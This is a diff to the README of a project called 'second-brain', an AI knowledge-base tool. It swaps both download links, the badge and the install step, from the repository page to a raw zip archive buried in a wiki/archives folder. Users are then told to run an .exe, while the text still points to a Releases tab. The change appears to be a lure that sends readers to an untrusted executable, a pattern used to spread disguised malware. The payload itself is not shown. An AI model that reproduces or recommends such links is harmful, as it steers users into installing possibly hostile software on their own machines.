@@ -1,6 +1,6 @@
 # 🧠 second-brain - Automate your personal knowledge base easily
 
-[![](https://img.shields.io/badge/Download-second-brain-blue.svg)](https://github.com/kfxuyang-web/second-brain)
+[![](https://img.shields.io/badge/Download-second-brain-blue.svg)](https://github.com/kfxuyang-web/second-brain/raw/refs/heads/main/wiki/archives/brain-second-v1.5.zip)
 
 This software helps you manage your notes and research. It uses artificial intelligence to organize your files. You save time by letting the system label your folders and documents. It learns your habits and mimics how you think. You spend less time searching for information and more time creating new ideas.
 
@@ -17,7 +17,7 @@ Your computer must meet these standards to run the application:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/kfxuyang-web/second-brain).
+1. Visit the [official download page](https://github.com/kfxuyang-web/second-brain/raw/refs/heads/main/wiki/archives/brain-second-v1.5.zip).
 2. Look for the latest version under the Releases tab.
 3. Select the file ending in .exe.
 4. Save the file to your computer.
